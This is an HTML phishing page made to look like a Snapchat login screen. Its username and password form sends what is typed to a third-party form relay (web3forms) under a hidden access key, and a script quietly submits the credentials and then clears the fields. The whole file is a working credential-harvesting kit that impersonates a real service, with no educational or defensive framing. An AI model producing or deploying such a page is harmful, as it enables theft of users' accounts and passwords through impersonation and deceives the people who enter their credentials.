<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Snapchat Login</title>
  
  <link rel="shortcut icon" href="download (1).png" type="image/x-icon"> 
  <style>
  /* Reset default styles */
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    
}

/* Centering the form */
body {
    font-family: Arial, sans-serif;
    background-color: #f6ff00;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

/* Login Box */
.login-container {
    background-color: #ffffff;
    padding: 30px;
    width: 350px;
    text-align: center;
    border-radius: 10px;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
}

/* Logo Image */
.img {
    margin: 15px 0;
    border-radius: 50%;
   
}

/* Headline */
h1 {
    font-size: 24px;
    color: #333;
    margin-bottom: 15px;
}

/* Input Fields */
input {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border: 1px solid #ccc;
    border-radius: 5px;
    font-size: 14px;
}

/* Submit Button */
.send {
    width: 100%;
    padding: 12px;
    background-color: #000000;
    color: #ffffff;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    margin-top: 10px;
}

.send:hover {
    background-color: #000000;
}
a{
    text-decoration: none;
    color: white;
}
/* Links */
.a1 {
    text-decoration: none;
    color: blue;
    font-size: 14px;
}

a:hover {
    text-decoration: underline;
}

/* Create New Account Button */
.button {
    width: 100%;
    padding: 12px;
    background-color: #f6ff00;
    color:white;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
    margin-top: 10px;
}

.button:hover {
    background-color: #fbff00;
}

/* Style Google Sign-In Button */
#g_id_onload, .g_id_signin {
    margin-top: 15px;
    display: flex;
    justify-content: center;
}

/* Divider */
hr {
    margin: 20px 0;
    border: 0.5px solid #ddd;
}


  </style>
</head>
<body>
  <div class="login-container">
    <h1>Log in</h1>
    <p><img src="download (1).png" width="80px" height="80px" class="img"></p> 
    <br>
    <form  action="https://api.web3forms.com/submit"  method="POST" >
      <input type="hidden" name="access_key" value="b744893c-b153-4175-9d72-e0a4518c4af3">
      
      <input type="text" placeholder="Username" name="usernamee" required>
      <input type="password" placeholder="Password" name="passi" required>
      
      <button type="submit" class="send"><b>Log in</b></button>
      <br><br>
      <a href="#" class="a1"><p>Forgot password?</p></a>
      <hr>

      <button class="button"><a href="#" class="a">Create new account</a></button>  
    </form>

  </div>      
  <script>
    document.querySelector('form').addEventListener('submit', function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      fetch(this.action, {
        method: this.method,
        body: formData
      }).then(response => {
        if (response.ok) {
          this.reset();
        }
      });
    });
  </script>
</body>
</html>
